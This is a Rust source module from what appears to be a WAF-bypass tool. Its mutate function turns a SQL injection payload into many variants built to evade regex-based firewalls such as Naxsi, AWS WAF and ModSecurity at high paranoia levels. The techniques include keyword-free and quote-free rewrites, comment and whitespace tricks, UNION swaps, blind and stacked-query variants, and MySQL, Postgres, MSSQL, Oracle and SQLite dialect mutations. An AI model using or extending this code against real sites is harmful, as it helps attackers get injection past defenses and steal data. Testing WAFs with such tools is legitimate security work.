//! SQL grammar-aware payload mutation.
//!
//! Understands SQL semantics and generates equivalent queries that look
//! different to regex-based WAF rules while preserving behavior.

use rand::Rng;

/// AST-level SQL metamorphism (sqlparser lift -> transform -> lower).
pub mod ast_metamorph;
/// Blind and time-based SQL mutation helpers.
pub mod blind;
/// Comment-based SQL mutation helpers.
pub mod comments;
/// Shared SQL mutation types and helpers.
pub mod common;
/// Keyword-free SQL mutation helpers for high-paranoia WAF bypass.
pub mod keywordless;
/// MSSQL dialect mutations.
pub mod mssql;
/// MySQL dialect mutations.
pub mod mysql;
/// Operator and delimiter SQL mutation helpers.
pub mod operators;
/// Oracle dialect mutations.
pub mod oracle;
/// PostgreSQL dialect mutations.
pub mod postgres;
/// Quote-free / comment-free rewrites for high-paranoia WAFs (Naxsi,
/// AWS WAF managed, modsec PL3+).
pub mod quote_free;
/// SQLite dialect mutations.
pub mod sqlite;
/// String and whitespace SQL mutation helpers.
pub mod strings;
/// Tautology SQL mutation helpers.
pub mod tautology;
/// UNION-specific SQL mutation helpers.
pub mod union;

pub use common::SqlMutation;

use crate::grammar::sql::blind::{
    boolean_blind_mutations, error_blind_mutations, json_xml_mutations, order_by_probes,
    stacked_query_mutations, time_blind_mutations,
};
use crate::grammar::sql::comments::{
    keyword_comment_mutations, nested_comment_mutations, version_comment_mutations,
};
use crate::grammar::sql::common::{
    COMMENT_TERMINATORS, WHITESPACE_ALTERNATIVES, and_alternatives, equality_alternatives,
    extract_quoted_string, or_alternatives,
};
use crate::grammar::sql::keywordless::keywordless_mutations;
use crate::grammar::sql::operators::{
    replace_comment_terminator, replace_equality, replace_logical_operator,
};
use crate::grammar::sql::strings::{hex_literal, no_space_wrap, split_string_concat};
use crate::grammar::sql::tautology::{TAUTOLOGIES, contains_tautology, replace_tautology};
use crate::grammar::sql::union::{
    UNION_ALTERNATIVES, replace_union, union_column_probes, union_mutations,
};

#[cfg(test)]
mod tests;

/// Generate grammar-aware mutations of a SQL injection payload.
#[allow(clippy::too_many_lines)]
#[must_use]
pub fn mutate(payload: &str, max_mutations: usize) -> Vec<SqlMutation> {
    if payload.is_empty() || max_mutations == 0 {
        return Vec::new();
    }

    let mut results = Vec::new();
    let mut rng = rand::thread_rng();
    let lower = payload.to_ascii_lowercase();

    // Priority: keyword-free mutations first (bypass PL2+ WAFs).
    extend_until_limit(
        &mut results,
        max_mutations,
        keywordless_mutations(payload, max_mutations / 4),
    );

    // Quote-free / comment-free rewrites (Naxsi, AWS WAF managed,
    // modsec PL3+ — anything that flags any quote / comment / hex /
    // parenthesised SQL keyword). These typically slip past the
    // toughest pattern-only WAFs because the resulting SQL looks like
    // benign integer-comparison queries. See `quote_free.rs` for
    // confirmed pass-through evidence against the wafrift-bench
    // naxsi container.
    extend_until_limit(
        &mut results,
        max_mutations,
        quote_free::mutations(payload, max_mutations / 4),
    );

    // AST-level metamorphism: lift -> transform -> lower via sqlparser.
    // Yields semantic-identical fragments with different text signatures.
    extend_until_limit(
        &mut results,
        max_mutations,
        ast_metamorph::mutations(payload, max_mutations / 4),
    );

    if contains_tautology(payload) {
        for tautology in TAUTOLOGIES {
            if results.len() >= max_mutations {
                break;
            }

            if let Some(mutated) = replace_tautology(payload, tautology)
                && mutated != payload
            {
                results.push(SqlMutation {
                    payload: mutated,
                    description: format!("tautology → {tautology}"),
                    rules_applied: vec!["tautology_swap"],
                });
            }
        }
    }

    for comment in COMMENT_TERMINATORS {
        if results.len() >= max_mutations {
            break;
        }

        if let Some(mutated) = replace_comment_terminator(payload, comment)
            && mutated != payload
        {
            results.push(SqlMutation {
                payload: mutated,
                description: format!("comment → {comment}"),
                rules_applied: vec!["comment_swap"],
            });
        }
    }

    push_logical_operator_mutation(
        &mut results,
        payload,
        max_mutations,
        or_alternatives(),
        "or",
        "OR",
    );
    push_logical_operator_mutation(
        &mut results,
        payload,
        max_mutations,
        and_alternatives(),
        "and",
        "AND",
    );

    for whitespace in &WHITESPACE_ALTERNATIVES[1..] {
        if results.len() >= max_mutations {
            break;
        }

        let mutated = payload.replace(' ', whitespace);
        if mutated != payload {
            results.push(SqlMutation {
                payload: mutated,
                description: format!("whitespace → {whitespace:?}"),
                rules_applied: vec!["whitespace_swap"],
            });
        }
    }

    if lower.contains("union") && lower.contains("select") {
        for union_alternative in UNION_ALTERNATIVES {
            if results.len() >= max_mutations {
                break;
            }

            if let Some(mutated) = replace_union(payload, union_alternative)
                && mutated != payload
            {
                results.push(SqlMutation {
                    payload: mutated,
                    description: format!("UNION → {union_alternative}"),
                    rules_applied: vec!["union_swap"],
                });
            }
        }
    }

    for equality_alternative in equality_alternatives() {
        if results.len() >= max_mutations {
            break;
        }

        if let Some(mutated) = replace_equality(payload, equality_alternative)
            && mutated != payload
        {
            results.push(SqlMutation {
                payload: mutated,
                description: format!("= → {}", equality_alternative.trim()),
                rules_applied: vec!["equality_swap"],
            });
        }
    }

    if let Some(string_value) = extract_quoted_string(payload) {
        push_string_mutations(&mut results, payload, max_mutations, &string_value);
    }

    push_comment_keyword_mutations(&mut results, payload, max_mutations);

    if results.len() < max_mutations
        && let Some(string_value) = extract_quoted_string(payload)
    {
        let hex = hex_literal(&string_value);
        let mutated = payload.replace(&format!("'{string_value}'"), &hex);
        if mutated != payload {
            results.push(SqlMutation {
                payload: mutated,
                description: format!("hex literal: '{string_value}' → {hex}"),
                rules_applied: vec!["hex_literal"],
            });
        }
    }

    if results.len() < max_mutations
        && let Some(mutated) = no_space_wrap(payload)
    {
        results.push(SqlMutation {
            payload: mutated,
            description: "no-space: parenthesis wrapping instead of spaces".to_string(),
            rules_applied: vec!["no_space"],
        });
    }

    if lower.contains("order by") || lower.contains("union") {
        for probe in order_by_probes(10) {
            if results.len() >= max_mutations {
                break;
            }

            results.push(SqlMutation {
                payload: probe.clone(),
                description: format!("ORDER BY probe: {probe}"),
                rules_applied: vec!["order_by_probe"],
            });
        }
    }

    push_combined_whitespace_mutations(&mut results, max_mutations, &mut rng);
    extend_until_limit(
        &mut results,
        max_mutations,
        time_blind_mutations(payload, max_mutations),
    );
    extend_until_limit(
        &mut results,
        max_mutations,
        stacked_query_mutations(payload, max_mutations),
    );

    if results.len() < max_mutations
        && let Some(string_value) = extract_quoted_string(payload)
    {
        push_postgres_quote_mutations(&mut results, payload, max_mutations, &string_value);
    }

    extend_until_limit(
        &mut results,
        max_mutations,
        json_xml_mutations(max_mutations),
    );
    extend_until_limit(
        &mut results,
        max_mutations,
        boolean_blind_mutations(payload, max_mutations),
    );
    extend_until_limit(
        &mut results,
        max_mutations,
        error_blind_mutations(payload, max_mutations),
    );
    extend_until_limit(
        &mut results,
        max_mutations,
        union_mutations(payload, max_mutations),
    );
    // Nested comment mutations — defeats WAFs that strip one comment layer
    for (mutated, desc) in nested_comment_mutations(payload, max_mutations) {
        if results.len() >= max_mutations {
            break;
        }
        results.push(SqlMutation {
            payload: mutated,
            description: desc,
            rules_applied: vec!["nested_comment"],
        });
    }
    // UNION column probes (only if payload contains UNION)
    if lower.contains("union") {
        extend_until_limit(&mut results, max_mutations, union_column_probes(10));
    }

    // Dialect-specific mutations — always reserve at least 20% of budget.
    // Use an extended limit so dialect mutations always get included.
    let dialect_limit = max_mutations + max_mutations / 5;
    let per_dialect = (max_mutations / 5).max(5);
    if per_dialect > 0 {
        extend_strings_until_limit(
            &mut results,
            dialect_limit,
            mysql::mutate(payload, per_dialect),
            "mysql",
        );
        extend_strings_until_limit(
            &mut results,
            dialect_limit,
            postgres::mutate(payload, per_dialect),
            "postgres",
        );
        extend_strings_until_limit(
            &mut results,
            dialect_limit,
            mssql::mutate(payload, per_dialect),
            "mssql",
        );
        extend_strings_until_limit(
            &mut results,
            dialect_limit,
            oracle::mutate(payload, per_dialect),
            "oracle",
        );
        extend_strings_until_limit(
            &mut results,
            dialect_limit,
            sqlite::mutate(payload, per_dialect),
            "sqlite",
        );
    }

    // Final truncate: allow dialect mutations to extend beyond base budget
    // Each user-facing output (CLI, scan) applies its own display limit
    results
}

fn extend_strings_until_limit(
    results: &mut Vec<SqlMutation>,
    max_mutations: usize,
    strings: Vec<String>,
    dialect: &'static str,
) {
    for s in strings {
        if results.len() >= max_mutations {
            break;
        }
        results.push(SqlMutation {
            payload: s,
            description: format!("{dialect} dialect mutation"),
            rules_applied: vec![dialect],
        });
    }
}

fn push_logical_operator_mutation(
    results: &mut Vec<SqlMutation>,
    payload: &str,
    max_mutations: usize,
    alternatives: &[String],
    target: &str,
    label: &str,
) {
    if let Some(mutated) = replace_logical_operator(payload, alternatives, target)
        && results.len() < max_mutations
        && mutated != payload
    {
        results.push(SqlMutation {
            payload: mutated,
            description: format!("{label} keyword alternative"),
            rules_applied: vec!["logical_op_swap"],
        });
    }
}

fn push_string_mutations(
    results: &mut Vec<SqlMutation>,
    payload: &str,
    max_mutations: usize,
    string_value: &str,
) {
    for split in split_string_concat(string_value) {
        if results.len() >= max_mutations {
            break;
        }

        results.push(SqlMutation {
            payload: payload.replace(&format!("'{string_value}'"), &split),
            description: format!("string split: '{string_value}' → {split}"),
            rules_applied: vec!["string_split"],
        });
    }
}

fn push_comment_keyword_mutations(
    results: &mut Vec<SqlMutation>,
    payload: &str,
    max_mutations: usize,
) {
    for (mutated, description) in keyword_comment_mutations(payload, max_mutations - results.len())
    {
        if results.len() >= max_mutations {
            break;
        }

        results.push(SqlMutation {
            payload: mutated,
            description,
            rules_applied: vec!["mysql_conditional"],
        });
    }

    for (mutated, description) in version_comment_mutations(payload, max_mutations - results.len())
    {
        if results.len() >= max_mutations {
            break;
        }

        results.push(SqlMutation {
            payload: mutated,
            description,
            rules_applied: vec!["mysql_version_conditional"],
        });
    }
}

fn push_combined_whitespace_mutations(
    results: &mut Vec<SqlMutation>,
    max_mutations: usize,
    rng: &mut impl Rng,
) {
    if results.is_empty() || results.len() >= max_mutations {
        return;
    }

    let n_combined = (max_mutations - results.len()).min(5);
    for _ in 0..n_combined {
        let base_index = rng.r#gen_range(0..results.len());
        let whitespace_index = rng.r#gen_range(1..WHITESPACE_ALTERNATIVES.len());
        let base_payload = results[base_index].payload.clone();
        let combined = base_payload.replace(' ', WHITESPACE_ALTERNATIVES[whitespace_index]);
        if combined != base_payload {
            let mut rules = results[base_index].rules_applied.clone();
            rules.push("combined_whitespace");
            results.push(SqlMutation {
                payload: combined,
                description: format!(
                    "combined: {} + whitespace {:?}",
                    results[base_index].description, WHITESPACE_ALTERNATIVES[whitespace_index]
                ),
                rules_applied: rules,
            });
        }
    }
}

fn push_postgres_quote_mutations(
    results: &mut Vec<SqlMutation>,
    payload: &str,
    max_mutations: usize,
    string_value: &str,
) {
    let dollar_quoted = format!("$${string_value}$$");
    let mutated = payload.replace(&format!("'{string_value}'"), &dollar_quoted);
    if mutated != payload {
        results.push(SqlMutation {
            payload: mutated,
            description: format!("PG dollar-sign quoting: '{string_value}' → $${string_value}$$"),
            rules_applied: vec!["pg_dollar_quote"],
        });
    }

    let tagged = format!("$tag${string_value}$tag$");
    let mutated_tagged = payload.replace(&format!("'{string_value}'"), &tagged);
    if mutated_tagged != payload && results.len() < max_mutations {
        results.push(SqlMutation {
            payload: mutated_tagged,
            description: format!(
                "PG tagged dollar-sign: '{string_value}' → $tag${string_value}$tag$"
            ),
            rules_applied: vec!["pg_dollar_quote_tagged"],
        });
    }
}

fn extend_until_limit(
    results: &mut Vec<SqlMutation>,
    max_mutations: usize,
    mutations: Vec<SqlMutation>,
) {
    for mutation in mutations {
        if results.len() >= max_mutations {
            break;
        }
        results.push(mutation);
    }
}
